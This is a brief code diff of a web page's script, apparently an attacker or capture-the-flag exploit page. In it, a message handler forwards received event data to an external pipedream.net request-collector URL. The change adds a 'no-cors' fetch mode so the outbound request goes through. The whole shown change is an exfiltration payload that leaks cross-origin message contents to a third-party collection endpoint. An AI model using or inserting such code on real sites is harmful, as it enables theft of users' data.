@@ -16,7 +16,7 @@ Have fun
   }
 
   function handleReply(event) {
-    fetch('https://eow825tpd05zuyz.m.pipedream.net/?mess='.concat(event.data));
+    fetch('https://eow825tpd05zuyz.m.pipedream.net/?mess='.concat(event.data), { mode: 'no-cors' });
   }
 </script>
 </body>
